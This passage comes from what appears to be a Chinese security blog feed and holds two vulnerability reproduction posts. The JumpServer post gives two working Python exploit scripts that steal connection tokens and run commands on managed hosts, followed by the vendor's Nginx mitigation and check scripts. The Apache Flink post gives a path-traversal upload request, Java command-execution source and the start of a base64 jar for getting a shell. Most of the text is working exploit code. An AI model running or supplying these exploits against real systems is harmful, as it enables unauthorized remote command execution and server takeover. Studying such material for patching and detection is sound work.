class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd+<span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line">        print(cmdtext)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;#######finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> sys</span><br><span class="line">        host=sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> host[<span class="number">-1</span>]==<span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            host=host[:<span class="number">-1</span>]</span><br><span class="line">        print(host)</span><br><span class="line">        data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;</span>,</span><br><span class="line">                <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;79655e4e-1741-46af-a793-fff394540a52&quot;</span>&#125;</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        res = requests.post(host + url, json=data)</span><br><span class="line">        token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        target = <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">        print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">        asyncio.get_event_loop().run_until_complete(main_logic(cmd))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;python jumpserver.py http://192.168.1.73 whoami&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="公开POC-2"><a href="#公开POC-2" class="headerlink" title="公开POC 2"></a>公开POC 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&#x27;http://127.0.0.1&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;ifconfig&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">    url = target_url.replace(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ws&quot;</span>) + <span class="string">&quot;/ws/ops/tasks/log/&quot;</span></span><br><span class="line">    print(<span class="string">&quot;Request =&gt; &quot;</span> + url + <span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(url, timeout=<span class="number">3</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&#x27;&#123;&quot;task&quot;:&quot;/opt/jumpserver/logs/gunicorn&quot;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rs = <span class="keyword">await</span> asyncio.wait_for(websocket.recv(), timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;/api/v1/perms/asset-permissions/user/validate&#x27;</span> <span class="keyword">in</span> rs:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&quot;Vulnerability may not exist&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;Vulnerability may exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = re.compile(<span class="string">r&#x27;asset_id=(.*?)&amp;cache_policy=1&amp;system_user_id=(.*?)&amp;user_id=(.*?) &#x27;</span>)</span><br><span class="line">        matchObj = pattern.search(rs)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> matchObj:</span><br><span class="line">            asset_id = matchObj.group(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">&#x27;asset_id = &#x27;</span> + asset_id)</span><br><span class="line">            system_user_id = matchObj.group(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">&#x27;system_user_id = &#x27;</span> + system_user_id)</span><br><span class="line">            user_id = matchObj.group(<span class="number">3</span>)</span><br><span class="line">            print(<span class="string">&#x27;user_id = &#x27;</span> + user_id)</span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;<span class="string">&#x27;asset&#x27;</span>: asset_id, <span class="string">&#x27;system_user&#x27;</span>: system_user_id, <span class="string">&#x27;user&#x27;</span>: user_id&#125;</span><br><span class="line">    url = target_url + <span class="string">&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;Request =&gt; &quot;</span> + url + <span class="string">&#x27; get token&#x27;</span>)</span><br><span class="line">    response = requests.post(url, json=data).json()</span><br><span class="line">    print(<span class="string">&#x27;token = &#x27;</span> + response[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(url, timeout=<span class="number">3</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + url)</span><br><span class="line">        rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">        id = json.loads(rs)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;id = &quot;</span> + id)</span><br><span class="line">        print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        init_payload = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + <span class="string">&quot;TERMINAL_INIT&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(init_payload)</span><br><span class="line">        rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line"></span><br><span class="line">        rs = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">&quot;Last login&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rs:</span><br><span class="line">            rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line"></span><br><span class="line">        cmd_payload = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd + <span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + <span class="string">&quot;Cmd Payload&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(cmd_payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rs = <span class="keyword">await</span> asyncio.wait_for(websocket.recv(), timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">                print(<span class="string">&#x27;recv data end&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    token = asyncio.get_event_loop().run_until_complete(get_token())</span><br><span class="line">    url = target_url.replace(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ws&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(attack(url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>参考 <a href="https://github.com/jumpserver/jumpserver">https://github.com/jumpserver/jumpserver</a></p><h2 id="紧急BUG修复通知"><a href="#紧急BUG修复通知" class="headerlink" title="紧急BUG修复通知"></a>紧急BUG修复通知</h2><p>JumpServer发现远程执行漏洞，请速度修复</p><p>非常感谢 <strong>reactivity of Alibaba Hackerone bug bounty program</strong>(瑞典) 向我们报告了此 BUG</p><p><strong>影响版本:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; v2.6.2</span><br><span class="line">&lt; v2.5.4</span><br><span class="line">&lt; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9</span><br><span class="line">&gt;&#x3D; v1.5.3</span><br></pre></td></tr></table></figure><p><strong>安全版本:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&#x3D; v2.6.2</span><br><span class="line">&gt;&#x3D; v2.5.4</span><br><span class="line">&gt;&#x3D; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9 （版本号没变）</span><br><span class="line">&lt; v1.5.3</span><br></pre></td></tr></table></figure><p><strong>修复方案:</strong></p><p>将JumpServer升级至安全版本；</p><p><strong>临时修复方案:</strong></p><p>修改 Nginx 配置文件屏蔽漏洞接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;</span><br><span class="line">&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;</span><br></pre></td></tr></table></figure><p>Nginx 配置文件位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 社区老版本</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf</span><br><span class="line"></span><br><span class="line"># 企业老版本</span><br><span class="line">jumpserver-release&#x2F;nginx&#x2F;http_server.conf</span><br><span class="line"> </span><br><span class="line"># 新版本在 </span><br><span class="line">jumpserver-release&#x2F;compose&#x2F;config_static&#x2F;http_server.conf</span><br></pre></td></tr></table></figure><p>修改 Nginx 配置文件实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">### 保证在 &#x2F;api 之前 和 &#x2F; 之前</span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line">### 新增以上这些</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F; &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;core:8080;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>修改完成后重启 nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker方式: </span><br><span class="line">docker restart jms_nginx</span><br><span class="line"></span><br><span class="line">nginx方式:</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p><strong>修复验证</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"># 使用方法 bash jms_bug_check.sh HOST </span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">漏洞已修复</span><br></pre></td></tr></table></figure><p><strong>入侵检测</strong></p><p>下载脚本到 jumpserver 日志目录，这个目录中存在 gunicorn.log，然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">&#x2F;opt&#x2F;jumpserver&#x2F;core&#x2F;logs</span><br><span class="line"></span><br><span class="line">$ ls gunicorn.log </span><br><span class="line">gunicorn.log</span><br><span class="line"></span><br><span class="line">$ wget &#39;https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_check_attack.sh&#39;</span><br><span class="line">$ bash jms_check_attack.sh</span><br><span class="line">系统未被入侵</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw">https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;JumpServer&lt;/strong&gt; 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：CVE-2020-17518 Apache Flink 目录遍历漏洞</title>
    <link href="https://hack-for.fun/16e0.html"/>
    <id>https://hack-for.fun/16e0.html</id>
    <published>2021-01-18T07:37:00.000Z</published>
    <updated>2021-01-18T12:43:31.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>2021年01月06日，Apache Flink<code>发布了</code>Apache Flink 目录穿越漏洞,目录穿越漏洞<code>的风险通告，漏洞编号为</code>CVE-2020-17518,CVE-2020-17519<code>，漏洞等级：</code>高危，漏洞评分：8.5</p><p>远程攻击者通过<code>REST API</code>目录遍历，可造成<code>文件读取/写入</code>的影响。</p><h3 id="CVE-2020-17518-文件写入漏洞"><a href="#CVE-2020-17518-文件写入漏洞" class="headerlink" title="CVE-2020-17518: 文件写入漏洞"></a>CVE-2020-17518: 文件写入漏洞</h3><p>攻击者利用<code>REST API</code>，可以修改<code>HTTP</code>头，将上传的文件写入到本地文件系统上的任意位置（<code>Flink 1.5.1</code>进程能访问到的）。</p><h3 id="CVE-2020-17519-文件读取漏洞"><a href="#CVE-2020-17519-文件读取漏洞" class="headerlink" title="CVE-2020-17519: 文件读取漏洞"></a>CVE-2020-17519: 文件读取漏洞</h3><p>Apache Flink 1.11.0 允许攻击者通过<code>JobManager</code>进程的<code>REST API</code>读取<code>JobManager</code>本地文件系统上的任何文件（<code>JobManager</code>进程能访问到的） 。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><h3 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h3><p>–<code>Apache:Apache Flink</code>: 1.11.0, 1.11.1, 1.11.2</p><h3 id="CVE-2020-17519-1"><a href="#CVE-2020-17519-1" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h3><p>–<code>Apache:Apache Flink</code>: 1.5.1 – 1.11.2</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="CVE-2020-17518-任意文件写入漏洞"><a href="#CVE-2020-17518-任意文件写入漏洞" class="headerlink" title="CVE-2020-17518 任意文件写入漏洞"></a>CVE-2020-17518 任意文件写入漏洞</h2><p>验证POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x:8081</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;x.x.x.x:8081&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: jNj0_2132_ulastactivity&#x3D;94cd6XUujZO6Ir8Y402Py8R2hRo4k9SYYId68%2Bsj5Hj9wct3lwDn; jNj0_2132_lastcheckfeed&#x3D;1%7C1603631734</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 185</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194912.png"></p><h2 id="配合Apache-Flink-1-9-x-File-Upload-RCE-Unauthenticated-部署jar包来GetShell"><a href="#配合Apache-Flink-1-9-x-File-Upload-RCE-Unauthenticated-部署jar包来GetShell" class="headerlink" title="配合Apache Flink 1.9.x - File Upload RCE (Unauthenticated) 部署jar包来GetShell"></a>配合Apache Flink 1.9.x - File Upload RCE (Unauthenticated) 部署jar包来GetShell</h2><p>利用条件：</p><ul><li>Flink 1.9.x 版本</li><li>唯一优点：相比直接上传jar包，有了隐蔽性。</li></ul><blockquote><p>参考文章中，直接上传jsp，web目录下不解析，会作为文件下载。</p></blockquote><h3 id="准备Jar包"><a href="#准备Jar包" class="headerlink" title="准备Jar包"></a>准备Jar包</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Execute</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String o = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String cmd = args[<span class="number">0</span>];</span><br><span class="line">        ProcessBuilder p;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            p = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String pty = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                pty = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;pty, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Process s = p.start();</span><br><span class="line">        Scanner c = (<span class="keyword">new</span> Scanner(s.getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将源码进行编译并打包为jar包，</p><p>Base64之后的jar包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEsDBBQAAAAIAASBJlLHe4y+9gIAAOgEAAANAAAARXhlY3V0ZS5jbGFzc21Uy1bUQBC9zTwSQnhFBEZ8gAoOCIwiKgKivEWGhwbRATaZ0AcCMwkmPQIbN&#x2F;oTfIFrNoNHjn6Av+MatToqLycn6UpX3Vt1q7uT7z+&#x2F;fAPQixUNTehQcVtFp4YudGsoR0rFHWnvKuhRcE9Fr4r7GlQ8UPFQQZ+KRxqq0C+HARWDMvRYwZCGJ3iqoQ7DKkakHZXDmIJxBRMM8UHHdcQQQyTZvsgQHfVWOUN12nH5bCGf5f6Clc1xCuQtx2WoTy6nN6x3VipnuWspU&#x2F;iOuzYgiZWmsOzNGWsrxJNABZOklEEb37H5lnA8N1DwjOamV&#x2F;BtPuHIrPr4DrcLgnfLnDou4woDGBQv6HatPKWZ0vEc0zrSmCGJ246rYxZzDI0nIuZ9z+ZBMFJwcqvcZ6g5r4&#x2F;y2fnVbr5DBctStizTQr5U1nFTwTqJCAmOl&#x2F;qjqTwMZK1gXSLndbzASyJ2EdHEAkNtCC8IJ5cybct1ua&#x2F;glY5FvJb4NwRdGdaRwZKOZdmP8rfHM8rmshvcFgwXSiwneU98x6t3trHdQPA8Q8UaF9T&#x2F;FvfFLkNbssTelMpfIby0t839USsgWXXJkiDV9lxBmx4wNJ1OPLpu+SZ&#x2F;W+CuzQfalxguJksfiTjfcQIRyKMlYbFAWL4g+Em5k92jerXnncSsov6m3K2CoLTcooYbiPxvu04FiN6YLBUIheiFgI&#x2F;xnJN3hDwgt0ou03+7Sjljds4LOFpwiT5IeZWByUNK41WatZBlZGMdB2D7kCf3Go0awciJKOL0vTYTrCyE&#x2F;6B5nOxHoyzdEemZMSKfES0iZsSLUPbQfAg1E&#x2F;+K8kzE0MxM1KgwM7FO8wD67Cf0GpX90UNUZYzqA9QUUbsHxagm1zEnEZUc45jTVcQFGa&#x2F;LJKjIxQPUGw1FNPbHErEiEvuymVBtD3QayxEh3Qq9N6CSfkHV6EMNJlGLafpbcPJuohHvkcAHWozrxGhF5Ai9Cm7QfYR6kPlF4aiCm&#x2F;Qa3q0E